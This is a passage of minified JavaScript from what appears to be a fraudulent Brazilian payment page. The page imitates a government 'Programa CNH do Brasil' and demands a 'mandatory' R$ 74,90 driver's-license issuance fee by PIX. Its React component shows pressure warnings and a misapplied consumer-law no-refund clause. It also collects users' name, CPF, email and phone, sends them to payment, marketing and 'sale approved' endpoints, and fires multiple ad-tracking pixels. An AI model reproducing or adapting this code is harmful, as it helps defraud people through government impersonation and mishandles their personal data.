    if (r.length < 3 || r.length === 5 || r.length > 8)
      throw new Error("Invalid hex color: " + n);
    (r.length === 3 || r.length === 4) && (r = Array.prototype.concat.apply([], r.map(function (o) {
      return [o, o]
    }))),
      r.length === 6 && r.push("F", "F");
    const s = parseInt(r.join(""), 16);
    return {
      r: s >> 24 & 255,
      g: s >> 16 & 255,
      b: s >> 8 & 255,
      a: s & 255,
      hex: "#" + r.slice(0, 6).join("")
    }
  }
  e.getOptions = function (r) {
    r || (r = {}),
      r.color || (r.color = {});
    const s = typeof r.margin > "u" || r.margin === null || r.margin < 0 ? 4 : r.margin
      , o = r.width && r.width >= 21 ? r.width : void 0
      , i = r.scale || 4;
    return {
      width: o,
      scale: o ? 4 : i,
      margin: s,
      color: {
        dark: t(r.color.dark || "#000000ff"),
        light: t(r.color.light || "#ffffffff")
      },
      type: r.type,
      rendererOpts: r.rendererOpts || {}
    }
  }
    ,
    e.getScale = function (r, s) {
      return s.width && s.width >= r + s.margin * 2 ? s.width / (r + s.margin * 2) : s.scale
    }
    ,
    e.getImageWidth = function (r, s) {
      const o = e.getScale(r, s);
      return Math.floor((r + s.margin * 2) * o)
    }
    ,
    e.qrToImageData = function (r, s, o) {
      const i = s.modules.size
        , l = s.modules.data
        , c = e.getScale(i, o)
        , u = Math.floor((i + o.margin * 2) * c)
        , d = o.margin * c
        , f = [o.color.light, o.color.dark];
      for (let h = 0; h < u; h++)
        for (let y = 0; y < u; y++) {
          let b = (h * u + y) * 4
            , v = o.color.light;
          if (h >= d && y >= d && h < u - d && y < u - d) {
            const C = Math.floor((h - d) / c)
              , g = Math.floor((y - d) / c);
            v = f[l[C * i + g] ? 1 : 0]
          }
          r[b++] = v.r,
            r[b++] = v.g,
            r[b++] = v.b,
            r[b] = v.a
        }
    }
}
)(Jf);
(function (e) {
  const t = Jf;
  function n(s, o, i) {
    s.clearRect(0, 0, o.width, o.height),
      o.style || (o.style = {}),
      o.height = i,
      o.width = i,
      o.style.height = i + "px",
      o.style.width = i + "px"
  }
  function r() {
    try {
      return document.createElement("canvas")
    } catch {
      throw new Error("You need to specify a canvas element")
    }
  }
  e.render = function (o, i, l) {
    let c = l
      , u = i;
    typeof c > "u" && (!i || !i.getContext) && (c = i,
      i = void 0),
      i || (u = r()),
      c = t.getOptions(c);
    const d = t.getImageWidth(o.modules.size, c)
      , f = u.getContext("2d")
      , h = f.createImageData(d, d);
    return t.qrToImageData(h.data, o, c),
      n(f, u, d),
      f.putImageData(h, 0, 0),
      u
  }
    ,
    e.renderToDataURL = function (o, i, l) {
      let c = l;
      typeof c > "u" && (!i || !i.getContext) && (c = i,
        i = void 0),
        c || (c = {});
      const u = e.render(o, i, c)
        , d = c.type || "image/png"
        , f = c.rendererOpts || {};
      return u.toDataURL(d, f.quality)
    }
}
)(e1);
var t1 = {};
const _3 = Jf;
function Tp(e, t) {
  const n = e.a / 255
    , r = t + '="' + e.hex + '"';
  return n < 1 ? r + " " + t + '-opacity="' + n.toFixed(2).slice(1) + '"' : r
}
function ou(e, t, n) {
  let r = e + t;
  return typeof n < "u" && (r += " " + n),
    r
}
function L3(e, t, n) {
  let r = ""
    , s = 0
    , o = !1
    , i = 0;
  for (let l = 0; l < e.length; l++) {
    const c = Math.floor(l % t)
      , u = Math.floor(l / t);
    !c && !o && (o = !0),
      e[l] ? (i++,
        l > 0 && c > 0 && e[l - 1] || (r += o ? ou("M", c + n, .5 + u + n) : ou("m", s, 0),
          s = 0,
          o = !1),
        c + 1 < t && e[l + 1] || (r += ou("h", i),
          i = 0)) : s++
  }
  return r
}
t1.render = function (t, n, r) {
  const s = _3.getOptions(n)
    , o = t.modules.size
    , i = t.modules.data
    , l = o + s.margin * 2
    , c = s.color.light.a ? "<path " + Tp(s.color.light, "fill") + ' d="M0 0h' + l + "v" + l + 'H0z"/>' : ""
    , u = "<path " + Tp(s.color.dark, "stroke") + ' d="' + L3(i, o, s.margin) + '"/>'
    , d = 'viewBox="0 0 ' + l + " " + l + '"'
    , h = '<svg xmlns="http://www.w3.org/2000/svg" ' + (s.width ? 'width="' + s.width + '" height="' + s.width + '" ' : "") + d + ' shape-rendering="crispEdges">' + c + u + `</svg>
`;
  return typeof r == "function" && r(null, h),
    h
}
  ;
const F3 = Zj
  , Cd = zx
  , n1 = e1
  , V3 = t1;
function Zf(e, t, n, r, s) {
  const o = [].slice.call(arguments, 1)
    , i = o.length
    , l = typeof o[i - 1] == "function";
  if (!l && !F3())
    throw new Error("Callback required as last argument");
  if (l) {
    if (i < 2)
      throw new Error("Too few arguments provided");
    i === 2 ? (s = n,
      n = t,
      t = r = void 0) : i === 3 && (t.getContext && typeof s > "u" ? (s = r,
        r = void 0) : (s = r,
          r = n,
          n = t,
          t = void 0))
  } else {
    if (i < 1)
      throw new Error("Too few arguments provided");
    return i === 1 ? (n = t,
      t = r = void 0) : i === 2 && !t.getContext && (r = n,
        n = t,
        t = void 0),
      new Promise(function (c, u) {
        try {
          const d = Cd.create(n, r);
          c(e(d, t, r))
        } catch (d) {
          u(d)
        }
      }
      )
  }
  try {
    const c = Cd.create(n, r);
    s(null, e(c, t, r))
  } catch (c) {
    s(c)
  }
}
uo.create = Cd.create;
uo.toCanvas = Zf.bind(null, n1.render);
uo.toDataURL = Zf.bind(null, n1.renderToDataURL);
uo.toString = Zf.bind(null, function (e, t, n) {
  return V3.render(e, n)
});
function kp() {
  const [, e] = Un()
    , [t, n] = x.useState(null)
    , [r, s] = x.useState(!0)
    , [o, i] = x.useState(!1)
    , [l, c] = x.useState(null)
    , [u, d] = x.useState(null)
    , [f, h] = x.useState("pending")
    , y = x.useRef(!1)
    , b = x.useRef(!1)
    , v = x.useRef(!1);
  x.useEffect(() => {
    if (b.current)
      return;
    b.current = !0;
    const m = "ttq_purchase_success_tracked";
    if (localStorage.getItem(m))
      return;
    const p = localStorage.getItem("userData");
    let w = ""
      , S = "";
    if (p)
      try {
        const P = JSON.parse(p);
        w = P.email || "",
          S = P.phone || ""
      } catch (P) {
        console.error("Error parsing userData for TikTok Pixel:", P)
      }
    const N = {
      content_type: "product",
      content_id: "cnh_brasil_taxa_emissao",
      content_name: "Taxa Emissao CNH - CNH do Brasil",
      value: 74.9,
      currency: "BRL",
      email: w,
      phone: S
    };
    if (typeof window.ttq < "u")
      try {
        window.ttq.track("CompletePayment", N),
          console.log("TikTok Pixel (D3A8DARC77UFKOQ7M5PG): CompletePayment tracked");
        const P = "D4PLT13C77U6HORARBNG";
        if (window.ttq.load && window.ttq.load(P),
          window.ttq.instance) {
          const A = window.ttq.instance(P);
          A && A.track && (A.track("Purchase", N),
            console.log("TikTok Pixel (D4PLT13C77U6HORARBNG): Purchase tracked"))
        }
      } catch (P) {
        console.error("TikTok Pixel error:", P)
      }
    if (typeof window.fbq < "u")
      try {
        window.fbq("track", "Purchase", {
          value: 74.9,
          currency: "BRL",
          content_name: "Taxa Emissao CNH - CNH do Brasil",
          content_type: "product"
        }),
          console.log("Facebook Pixel (3270339329986286): Purchase tracked"),
          window.fbq("trackSingle", "1555494242118668", "Purchase", {
            value: 74.9,
            currency: "BRL",
            content_name: "Taxa Emissao CNH - CNH do Brasil",
            content_type: "product"
          }),
          console.log("Facebook Pixel (1555494242118668): Purchase tracked"),
          window.fbq("trackSingle", "1154359756859567", "Purchase", {
            value: 74.9,
            currency: "BRL",
            content_name: "Taxa Emissao CNH - CNH do Brasil",
            content_type: "product"
          }),
          console.log("Facebook Pixel (1154359756859567): Purchase tracked"),
          window.fbq("trackSingle", "2062889337802425", "Purchase", {
            value: 74.9,
            currency: "BRL",
            content_name: "Taxa Emissao CNH - CNH do Brasil",
            content_type: "product"
          }),
          console.log("Facebook Pixel (2062889337802425): Purchase tracked")
      } catch (P) {
        console.error("Facebook Pixel error:", P)
      }
    localStorage.setItem(m, new Date().toISOString())
  }
    , []),
    x.useEffect(() => {
      if (v.current)
        return;
      v.current = !0,
        (async () => {
          try {
            const p = localStorage.getItem("userData")
              , w = localStorage.getItem("detranData");
            let S = {
              nome: "",
              cpf: "",
              email: "",
              phone: ""
            }
              , N = "";
            if (p && (S = JSON.parse(p)),
              w) {
              const P = JSON.parse(w);
              N = P.nome || P.uf || ""
            }
            await fetch("/api/notify-approved", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                nome: S.nome,
                cpf: S.cpf,
                valor: 94.73,
                email: S.email || "",
                telefone: S.phone || "",
                detran: N
              })
            }),
              console.log("[Success] Notificação de venda APROVADA enviada")
          } catch (p) {
            console.error("[Success] Erro ao enviar notificação APROVADA:", p)
          }
        }
        )()
    }
      , []),
    x.useEffect(() => {
      (async () => {
        if (!y.current) {
          y.current = !0,
            s(!0),
            c(null);
          try {
            const p = localStorage.getItem("userData");
            if (!p) {
              c("Dados do usuário não encontrados"),
                s(!1);
              return
            }
            const w = JSON.parse(p)
              , N = await (await fetch("/api/create-pix.php", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  amount: 74.9,
                  customer_name: w.nome,
                  customer_email: w.email || "cliente@email.com",
                  customer_phone: w.phone || "11999999999",
                  customer_cpf: w.cpf,
                  utmParams: Object.fromEntries(new URLSearchParams(window.location.search))
                })
              })).json();
            if (N.success) {
              try {
                fetch("/proxy_notificar_utmify.php", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    transactionId: N.transaction_id,
                    valorEmCentavos: 7490,
                    nomeCliente: w.nome,
                    emailCliente: w.email || "cliente@email.com",
                    cpfCliente: w.cpf,
                    telefoneCliente: w.phone || "11999999999",
                    utmParams: Object.fromEntries(new URLSearchParams(window.location.search)),
                    productIdForPixel: "CNH_TAXA_01",
                    productNameForPixel: "Taxas Administrativas CNH",
                    productQuantity: 1
                  })
                });
              } catch (err) { console.error("Utmify Error", err); }
              if (n(N),
                N.pix_code)
                try {
                  const P = await uo.toDataURL(N.pix_code, {
                    width: 256,
                    margin: 2,
                    color: {
                      dark: "#000000",
                      light: "#FFFFFF"
                    }
                  });
                  d(P)
                } catch (P) {
                  console.error("Erro ao gerar QR code:", P)
                }
            } else
              c(N.error || "Erro ao gerar PIX")
          } catch (p) {
            console.error("Erro ao criar transação PIX:", p),
              c("Erro ao conectar com o servidor")
          } finally {
            s(!1)
          }
        }
      }
      )()
    }
      , []),
    x.useEffect(() => {
      if (!(t != null && t.transaction_id))
        return;
      const m = async () => {
        try {
          const S = await (await fetch(`/api/check-pix.php/${t.transaction_id}`)).json();
          if (S.success && S.status) {
            if (h(S.status),
              S.status === "paid")
              return console.log("PAGAMENTO DA TAXA DE EMISSÃO CONFIRMADO!"),
                setTimeout(() => {
                  e("/cadastro-concluido")
                }
                  , 1e3),
                !0;
            if (S.status === "expired" || S.status === "cancelled")
              return c("Transação expirada ou cancelada. Por favor, tente novamente."),
                !0
          }
          return !1
        } catch (w) {
          return console.error("Erro ao verificar status:", w),
            !1
        }
      }
        , p = setInterval(async () => {
          await m() && clearInterval(p)
        }
          , 5e3);
      return () => clearInterval(p)
    }
      , [t == null ? void 0 : t.transaction_id, e]);
  const C = async () => {
    if (t != null && t.pix_code)
      try {
        await navigator.clipboard.writeText(t.pix_code),
          i(!0),
          setTimeout(() => i(!1), 2e3)
      } catch (m) {
        console.error("Erro ao copiar:", m)
      }
  }
    , g = () => {
      y.current = !1,
        s(!0),
        c(null),
        window.location.reload()
    }
    ;
  return f === "paid" ? a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsx(En, {
        className: "max-w-xl mx-auto",
        children: a.jsx(Tn, {
          className: "pt-6",
          children: a.jsxs("div", {
            className: "text-center",
            children: [a.jsx("div", {
              className: "w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4",
              children: a.jsx(Ft, {
                className: "w-8 h-8 text-green-600"
              })
            }), a.jsx("h2", {
              className: "text-2xl font-bold text-green-600 mb-2",
              children: "Pagamento Confirmado!"
            }), a.jsx("p", {
              className: "text-gray-600",
              children: "Seu cadastro foi concluído com sucesso!"
            }), a.jsx("p", {
              className: "text-gray-500 text-sm mt-2",
              children: "Redirecionando..."
            })]
          })
        })
      })
    })]
  }) : a.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: a.jsxs(En, {
        className: "max-w-xl mx-auto shadow-lg border-0",
        children: [a.jsxs(wi, {
          className: "text-center space-y-2 pb-4 border-b",
          children: [a.jsx(bi, {
            className: "text-2xl font-bold text-gray-900",
            children: "Taxa de Emissão da CNH"
          }), a.jsx("p", {
            className: "text-gray-600",
            children: "Esta é a última taxa obrigatória. Após a confirmação do pagamento, você receberá acesso completo ao aplicativo do Programa CNH do Brasil."
          })]
        }), a.jsxs(Tn, {
          className: "pt-6",
          children: [a.jsx("div", {
            className: "flex justify-center mb-6",
            children: a.jsx("img", {
              src: "https://clubedetran.com.br/wp-content/uploads/2018/08/Lancada-a-Carteira-Digital-de-Transito.jpg.webp",
              alt: "Carteira Digital de Trânsito",
              className: "max-w-full h-auto rounded-lg shadow-md",
              style: {
                maxHeight: "200px"
              }
            })
          }), a.jsxs("div", {
            className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
            children: [a.jsx("h4", {
              className: "font-semibold text-blue-900 mb-2 text-center",
              children: "Importante"
            }), a.jsxs("ul", {
              className: "text-sm text-blue-800 space-y-2",
              children: [a.jsxs("li", {
                children: ["• Esta taxa é ", a.jsx("strong", {
                  children: "obrigatória"
                }), " para finalizar seu cadastro no Programa CNH do Brasil"]
              }), a.jsxs("li", {
                children: ["• Valor único de ", a.jsx("strong", {
                  children: "R$ 74,90"
                }), " pago uma única vez"]
              }), a.jsx("li", {
                children: "• Taxa destinada ao processo de emissão e regularização da CNH"
              }), a.jsx("li", {
                children: "• Seu cadastro só será concluído após a confirmação deste pagamento"
              })]
            })]
          }), a.jsxs("div", {
            className: "bg-red-50 p-4 rounded-lg border border-red-200 mb-6",
            children: [a.jsx("h4", {
              className: "font-semibold text-red-800 mb-2 text-center",
              children: "⚠️ Atenção"
            }), a.jsxs("p", {
              className: "text-sm text-red-700",
              children: ["Informamos que, caso o pagamento da ", a.jsx("strong", {
                children: "Taxa de Emissão da CNH"
              }), " não seja realizado, seu cadastro ", a.jsx("strong", {
                children: "não será concluído"
              }), " e você ", a.jsx("strong", {
                children: "perderá o direito de participar do Programa CNH do Brasil"
              }), ". Conforme o art. 49, §2º da Lei nº 8.078/1990 (Código de Defesa do Consumidor), não haverá reembolso do valor já pago referente às taxas administrativas, uma vez que o serviço de processamento já foi iniciado junto ao DETRAN."]
            })]
          }), a.jsxs("div", {
            className: "text-center mb-6",
            children: [a.jsx("p", {
              className: "text-3xl font-bold text-green-600",
              children: "R$ 74,90"
            }), a.jsx("p", {
              className: "text-gray-600",
              children: "Taxa única de emissão"
            })]
          }), r ? a.jsxs("div", {
            className: "text-center py-8",
            children: [a.jsx(dt, {
              className: "h-12 w-12 animate-spin text-[#1351B4] mx-auto mb-4"
            }), a.jsx("p", {
              className: "text-gray-600 font-medium",
              children: "Gerando PIX..."
            }), a.jsx("p", {
              className: "text-gray-500 text-sm mt-1",
              children: "Aguarde um momento"
            })]
          }) : l ? a.jsxs("div", {
            className: "text-center space-y-4",
            children: [a.jsx("div", {
              className: "bg-red-50 p-4 rounded-lg border border-red-100",
              children: a.jsx("p", {
                className: "text-red-800 text-sm",
                children: l
              })
            }), a.jsx(Mn, {
              onClick: g,
              className: "bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
              children: "Tentar Novamente"
            })]
          }) : a.jsxs(a.Fragment, {
            children: [a.jsxs("div", {
              className: "bg-yellow-50 p-4 rounded-lg border border-yellow-200 mb-6",
              children: [a.jsxs("div", {
                className: "flex items-center justify-center gap-3",
                children: [a.jsx(dt, {
                  className: "h-5 w-5 animate-spin text-yellow-600"
                }), a.jsx("span", {
                  className: "font-medium text-yellow-800",
                  children: "Aguardando pagamento..."
                })]
              }), a.jsx("p", {
                className: "text-center text-yellow-700 text-sm mt-2",
                children: "O pagamento será confirmado automaticamente"
              })]
            }), a.jsxs("div", {
              className: "text-center mb-6",
              children: [u ? a.jsx("div", {
                className: "bg-white p-4 rounded-lg border-2 border-gray-200 inline-block",
                children: a.jsx("img", {
                  src: u,
                  alt: "QR Code PIX",
                  className: "w-48 h-48"
                })
              }) : a.jsxs("div", {
                className: "bg-white p-8 rounded-lg border-2 border-gray-200 inline-block",
                children: [a.jsx(dt, {
                  className: "h-8 w-8 animate-spin text-[#1351B4] mx-auto"
                }), a.jsx("p", {
                  className: "text-sm text-gray-500 mt-2",
                  children: "Gerando QR Code..."
                })]
              }), a.jsx("p", {
                className: "text-sm text-gray-600 mt-3",
                children: "Escaneie o QR Code com o app do seu banco"
              })]
            }), (t == null ? void 0 : t.pix_code) && a.jsxs("div", {
              className: "mb-6",
              children: [a.jsx("p", {
                className: "text-sm font-medium text-gray-700 mb-2",
                children: "Código PIX Copia e Cola:"
              }), a.jsxs("div", {
                className: "space-y-3",
                children: [a.jsx("div", {
                  className: "p-3 bg-gray-50 rounded-lg border font-mono text-xs break-all max-h-20 overflow-y-auto",
                  children: t.pix_code
                }), a.jsxs(Mn, {
                  onClick: C,
                  className: "w-full flex items-center justify-center gap-2 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
                  children: [o ? a.jsx(Ft, {
                    className: "h-4 w-4"
                  }) : a.jsx(Kl, {
                    className: "h-4 w-4"
                  }), o ? "Copiado!" : "Copiar Código PIX"]
                })]
              })]
            }), a.jsxs("div", {
              className: "bg-gray-50 p-4 rounded-lg border mb-4",
              children: [a.jsx("h4", {
                className: "font-semibold text-gray-900 mb-2 text-center",
                children: "Como pagar:"
              }), a.jsxs("ol", {
                className: "text-sm text-gray-700 space-y-1",
                children: [a.jsx("li", {
                  children: "1. Abra o aplicativo do seu banco"
                }), a.jsx("li", {
                  children: "2. Acesse a opção PIX"
                }), a.jsx("li", {
                  children: "3. Escaneie o QR Code ou cole o código PIX"
                }), a.jsx("li", {
                  children: "4. Confirme o pagamento de R$ 74,90"
                })]
              })]
            }), t && a.jsx("div", {
              className: "border-t pt-4 text-center",
              children: a.jsxs("p", {
                className: "text-xs text-gray-500",
                children: ["ID da Transação: ", t.transaction_id]
              })
            })]
          })]
        })]
      })
    })]
  })
}
function B3(e) {
  if (typeof Proxy > "u")
    return e;
  const t = new Map
    , n = (...r) => e(...r);
  return new Proxy(n, {
    get: (r, s) => s === "create" ? e : (t.has(s) || t.set(s, e(s)),
      t.get(s))
  })
}
function nc(e) {
  return e !== null && typeof e == "object" && typeof e.start == "function"
}
const Nd = e => Array.isArray(e);
function r1(e, t) {
  if (!Array.isArray(t))
    return !1;
  const n = t.length;
  if (n !== e.length)
    return !1;
  for (let r = 0; r < n; r++)
    if (t[r] !== e[r])
      return !1;
  return !0
}
function Ci(e) {
  return typeof e == "string" || Array.isArray(e)
}
function Dp(e) {
  const t = [{}, {}];
  return e == null || e.values.forEach((n, r) => {
    t[0][r] = n.get(),
      t[1][r] = n.getVelocity()
  }
  ),
    t
}
function eh(e, t, n, r) {
  if (typeof t == "function") {
    const [s, o] = Dp(r);
    t = t(n !== void 0 ? n : e.custom, s, o)
  }
  if (typeof t == "string" && (t = e.variants && e.variants[t]),
    typeof t == "function") {
    const [s, o] = Dp(r);
    t = t(n !== void 0 ? n : e.custom, s, o)
  }
  return t
}
function rc(e, t, n) {
  const r = e.getProps();
  return eh(r, t, n !== void 0 ? n : r.custom, e)
}
const th = ["animate", "whileInView", "whileFocus", "whileHover", "whileTap", "whileDrag", "exit"]
  , nh = ["initial", ...th]
  , Fi = ["transformPerspective", "x", "y", "z", "translateX", "translateY", "translateZ", "scale", "scaleX", "scaleY", "rotate", "rotateX", "rotateY", "rotateZ", "skew", "skewX", "skewY"]
  , rs = new Set(Fi)
  , Rn = e => e * 1e3
  , On = e => e / 1e3
  , z3 = {
    type: "spring",
    stiffness: 500,
    damping: 25,
    restSpeed: 10
  }
  , U3 = e => ({
    type: "spring",
    stiffness: 550,
    damping: e === 0 ? 2 * Math.sqrt(550) : 30,
    restSpeed: 10
  })
  , $3 = {
    type: "keyframes",
    duration: .8
  }
  , H3 = {
    type: "keyframes",
    ease: [.25, .1, .35, 1],
    duration: .3
  }
  , W3 = (e, { keyframes: t }) => t.length > 2 ? $3 : rs.has(e) ? e.startsWith("scale") ? U3(t[1]) : z3 : H3;
function rh(e, t) {
  return e ? e[t] || e.default || e : void 0
}
const Q3 = {
  skipAnimations: !1,
  useManualTiming: !1
}
  , q3 = e => e !== null;
function sc(e, { repeat: t, repeatType: n = "loop" }, r) {
  const s = e.filter(q3)
    , o = t && n !== "loop" && t % 2 === 1 ? 0 : s.length - 1;
  return !o || r === void 0 ? s[o] : r
}
const Je = e => e;
let jd = Je;
function G3(e) {
  let t = new Set
    , n = new Set
    , r = !1
    , s = !1;
  const o = new WeakSet;
  let i = {
    delta: 0,
    timestamp: 0,
    isProcessing: !1
  };
  function l(u) {
    o.has(u) && (c.schedule(u),
      e()),
      u(i)
  }
  const c = {
    schedule: (u, d = !1, f = !1) => {
      const y = f && r ? t : n;
      return d && o.add(u),
        y.has(u) || y.add(u),
        u
    }
    ,
    cancel: u => {
      n.delete(u),
        o.delete(u)
    }
    ,
    process: u => {
      if (i = u,
        r) {
        s = !0;
        return
      }
      r = !0,
        [t, n] = [n, t],
        n.clear(),
        t.forEach(l),
        r = !1,
        s && (s = !1,
          c.process(u))
    }
  };
  return c
}
const va = ["read", "resolveKeyframes", "update", "preRender", "render", "postRender"]
  , K3 = 40;
function s1(e, t) {
  let n = !1
    , r = !0;
  const s = {
    delta: 0,
    timestamp: 0,
    isProcessing: !1
  }
    , o = () => n = !0
    , i = va.reduce((g, m) => (g[m] = G3(o),
      g), {})
    , { read: l, resolveKeyframes: c, update: u, preRender: d, render: f, postRender: h } = i
    , y = () => {
      const g = performance.now();
      n = !1,
        s.delta = r ? 1e3 / 60 : Math.max(Math.min(g - s.timestamp, K3), 1),
        s.timestamp = g,
        s.isProcessing = !0,
        l.process(s),
        c.process(s),
        u.process(s),
        d.process(s),
        f.process(s),
        h.process(s),
        s.isProcessing = !1,
        n && t && (r = !1,
          e(y))
    }
    , b = () => {
      n = !0,
        r = !0,
        s.isProcessing || e(y)
    }
    ;
  return {
    schedule: va.reduce((g, m) => {
      const p = i[m];
      return g[m] = (w, S = !1, N = !1) => (n || b(),
        p.schedule(w, S, N)),
        g
    }
      , {}),
    cancel: g => {
      for (let m = 0; m < va.length; m++)
        i[va[m]].cancel(g)
    }
    ,
    state: s,
    steps: i
  }
}
const { schedule: de, cancel: Cr, state: Be, steps: iu } = s1(typeof requestAnimationFrame < "u" ? requestAnimationFrame : Je, !0)
  , o1 = (e, t, n) => (((1 - 3 * n + 3 * t) * e + (3 * n - 6 * t)) * e + 3 * t) * e
  , Y3 = 1e-7
  , X3 = 12;
function J3(e, t, n, r, s) {
  let o, i, l = 0;
  do
    i = t + (n - t) / 2,
      o = o1(i, r, s) - e,
      o > 0 ? n = i : t = i;
  while (Math.abs(o) > Y3 && ++l < X3);
  return i
}
function Vi(e, t, n, r) {
  if (e === t && n === r)
    return Je;
  const s = o => J3(o, 0, 1, e, n);
  return o => o === 0 || o === 1 ? o : o1(s(o), t, r)
}
const i1 = e => t => t <= .5 ? e(2 * t) / 2 : (2 - e(2 * (1 - t))) / 2
  , a1 = e => t => 1 - e(1 - t)
  , l1 = Vi(.33, 1.53, .69, .99)
  , sh = a1(l1)
  , c1 = i1(sh)
  , u1 = e => (e *= 2) < 1 ? .5 * sh(e) : .5 * (2 - Math.pow(2, -10 * (e - 1)))
  , oh = e => 1 - Math.sin(Math.acos(e))
  , d1 = a1(oh)
  , f1 = i1(oh)
  , h1 = e => /^0[^.\s]+$/u.test(e);
function Z3(e) {
  return typeof e == "number" ? e === 0 : e !== null ? e === "none" || e === "0" || h1(e) : !0
}
const m1 = e => /^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(e)
  , p1 = e => t => typeof t == "string" && t.startsWith(e)
  , g1 = p1("--")
  , eP = p1("var(--")
  , ih = e => eP(e) ? tP.test(e.split("/*")[0].trim()) : !1
  , tP = /var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu
  , nP = /^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;
function rP(e) {
  const t = nP.exec(e);
  if (!t)
    return [,];
  const [, n, r, s] = t;
  return [`--${n ?? r}`, s]
}
function y1(e, t, n = 1) {
  const [r, s] = rP(e);
  if (!r)
    return;
  const o = window.getComputedStyle(t).getPropertyValue(r);
  if (o) {
    const i = o.trim();
    return m1(i) ? parseFloat(i) : i
  }
  return ih(s) ? y1(s, t, n + 1) : s
}
const Bn = (e, t, n) => n > t ? t : n < e ? e : n
  , fo = {
    test: e => typeof e == "number",
    parse: parseFloat,
    transform: e => e
  }
  , Ni = {
    ...fo,
    transform: e => Bn(0, 1, e)
  }
  , xa = {
    ...fo,
    default: 1
  }
  , Bi = e => ({
    test: t => typeof t == "string" && t.endsWith(e) && t.split(" ").length === 1,
    parse: parseFloat,
    transform: t => `${t}${e}`
  })
  , Xn = Bi("deg")
  , pn = Bi("%")
  , Y = Bi("px")
  , sP = Bi("vh")
  , oP = Bi("vw")
  , Mp = {
    ...pn,
    parse: e => pn.parse(e) / 100,
    transform: e => pn.transform(e * 100)
  }
  , iP = new Set(["width", "height", "top", "left", "right", "bottom", "x", "y", "translateX", "translateY"])
  , Rp = e => e === fo || e === Y
  , Op = (e, t) => parseFloat(e.split(", ")[t])
  , Ip = (e, t) => (n, { transform: r }) => {
    if (r === "none" || !r)
      return 0;
    const s = r.match(/^matrix3d\((.+)\)$/u);
    if (s)
      return Op(s[1], t);
    {
      const o = r.match(/^matrix\((.+)\)$/u);
      return o ? Op(o[1], e) : 0
    }
  }
  , aP = new Set(["x", "y", "z"])
  , lP = Fi.filter(e => !aP.has(e));
function cP(e) {
  const t = [];
  return lP.forEach(n => {
    const r = e.getValue(n);
    r !== void 0 && (t.push([n, r.get()]),
      r.set(n.startsWith("scale") ? 1 : 0))
  }
  ),
    t
}
const ro = {
  width: ({ x: e }, { paddingLeft: t = "0", paddingRight: n = "0" }) => e.max - e.min - parseFloat(t) - parseFloat(n),
  height: ({ y: e }, { paddingTop: t = "0", paddingBottom: n = "0" }) => e.max - e.min - parseFloat(t) - parseFloat(n),
  top: (e, { top: t }) => parseFloat(t),
  left: (e, { left: t }) => parseFloat(t),
  bottom: ({ y: e }, { top: t }) => parseFloat(t) + (e.max - e.min),
  right: ({ x: e }, { left: t }) => parseFloat(t) + (e.max - e.min),
  x: Ip(4, 13),
  y: Ip(5, 14)
};
ro.translateX = ro.x;
ro.translateY = ro.y;
const v1 = e => t => t.test(e)
  , uP = {
    test: e => e === "auto",
    parse: e => e
  }
  , x1 = [fo, Y, pn, Xn, oP, sP, uP]
  , _p = e => x1.find(v1(e))
  , qr = new Set;
let Pd = !1
  , Ad = !1;
function w1() {
  if (Ad) {
    const e = Array.from(qr).filter(r => r.needsMeasurement)
      , t = new Set(e.map(r => r.element))
      , n = new Map;
    t.forEach(r => {
      const s = cP(r);
      s.length && (n.set(r, s),
        r.render())
    }
    ),
      e.forEach(r => r.measureInitialState()),
      t.forEach(r => {
        r.render();
        const s = n.get(r);
        s && s.forEach(([o, i]) => {
          var l;
          (l = r.getValue(o)) === null || l === void 0 || l.set(i)
        }
        )
      }
      ),
      e.forEach(r => r.measureEndState()),
      e.forEach(r => {
        r.suspendedScrollY !== void 0 && window.scrollTo(0, r.suspendedScrollY)
      }
      )
  }
  Ad = !1,
    Pd = !1,
    qr.forEach(e => e.complete()),
    qr.clear()
}
function b1() {
  qr.forEach(e => {
    e.readKeyframes(),
      e.needsMeasurement && (Ad = !0)
  }
  )
}
function dP() {
  b1(),
    w1()
}
class ah {
  constructor(t, n, r, s, o, i = !1) {
    this.isComplete = !1,
      this.isAsync = !1,
      this.needsMeasurement = !1,
      this.isScheduled = !1,
      this.unresolvedKeyframes = [...t],
      this.onComplete = n,
      this.name = r,
      this.motionValue = s,
      this.element = o,
      this.isAsync = i
  }
  scheduleResolve() {
    this.isScheduled = !0,
      this.isAsync ? (qr.add(this),
        Pd || (Pd = !0,
          de.read(b1),
          de.resolveKeyframes(w1))) : (this.readKeyframes(),
            this.complete())
  }
  readKeyframes() {
    const { unresolvedKeyframes: t, name: n, element: r, motionValue: s } = this;
    for (let o = 0; o < t.length; o++)
      if (t[o] === null)
        if (o === 0) {
          const i = s == null ? void 0 : s.get()
            , l = t[t.length - 1];
          if (i !== void 0)
            t[0] = i;
          else if (r && n) {
            const c = r.readValue(n, l);
            c != null && (t[0] = c)
          }
          t[0] === void 0 && (t[0] = l),
            s && i === void 0 && s.set(t[0])
        } else
          t[o] = t[o - 1]
  }
  setFinalKeyframe() { }
  measureInitialState() { }
  renderEndStyles() { }
  measureEndState() { }
  complete() {
    this.isComplete = !0,
      this.onComplete(this.unresolvedKeyframes, this.finalKeyframe),
      qr.delete(this)
  }
  cancel() {
    this.isComplete || (this.isScheduled = !1,
      qr.delete(this))
  }
  resume() {
    this.isComplete || this.scheduleResolve()
  }
}
const Xo = e => Math.round(e * 1e5) / 1e5
  , lh = /-?(?:\d+(?:\.\d+)?|\.\d+)/gu;
function fP(e) {
  return e == null
}
